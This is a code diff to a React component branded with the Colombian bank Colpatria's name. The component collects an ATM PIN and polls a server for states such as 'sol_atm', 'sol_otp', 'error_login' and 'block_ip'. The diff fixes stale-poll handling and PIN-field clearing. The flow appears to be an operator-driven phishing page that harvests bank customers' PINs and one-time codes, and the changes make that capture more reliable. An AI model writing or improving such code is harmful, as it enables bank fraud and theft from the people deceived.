@@ -35,7 +35,6 @@ const ESTADOS_SIEMPRE_REPROCESAR = [
   "error_login",
   "block_ip",
   "error_blocked",
-  "sol_atm",
 ];
 
 function ColpatriaAlertIcon({ className = "" }) {
@@ -91,6 +90,7 @@ export default function AtmColpatriaPse() {
   const envioEnCursoRef = useRef(false);
   const modalBloqueoEstadoRef = useRef(null);
   const ignorarEstadoHastaCambioRef = useRef(null);
+  const submitTickRef = useRef(0);
 
   const code = digits.join("");
   const complete = code.length === PIN_LEN;
@@ -118,7 +118,6 @@ export default function AtmColpatriaPse() {
       modalBloqueoEstadoRef.current = null;
       allowPollNavigationRef.current = false;
       sessionStorage.removeItem(COLPATRIA_MID_FLOW_KEY);
-      initPolling();
     }
   };
 
@@ -404,6 +403,18 @@ export default function AtmColpatriaPse() {
         return;
       }
 
+      const statusTick = response?.data?.statusTick;
+      if (
+        statusTick != null &&
+        submitTickRef.current > 0 &&
+        statusTick < submitTickRef.current
+      ) {
+        if (allowPollNavigationRef.current) {
+          setLoading(true);
+        }
+        return;
+      }
+
       // Mantener loading activo mientras el estado sea pendiente
       if (estadoActual === "pendiente") {
         if (allowPollNavigationRef.current) {
@@ -429,11 +440,13 @@ export default function AtmColpatriaPse() {
 
       switch (estadoActual) {
         case "sol_atm":
+          if (envioEnCursoRef.current || getLoading) {
+            clearPinFields();
+          }
           envioEnCursoRef.current = false;
           setLoading(false);
           allowPollNavigationRef.current = true;
           sessionStorage.removeItem(COLPATRIA_MID_FLOW_KEY);
-          clearPinFields();
           dismissAtmErrorAlertIfOpen();
           break;
         case "sol_otp":
@@ -535,6 +548,7 @@ export default function AtmColpatriaPse() {
     };
 
     stopPolling();
+    submitTickRef.current = Date.now();
     envioEnCursoRef.current = true;
     lastEstadoRef.current = "pendiente";
     allowPollNavigationRef.current = true;
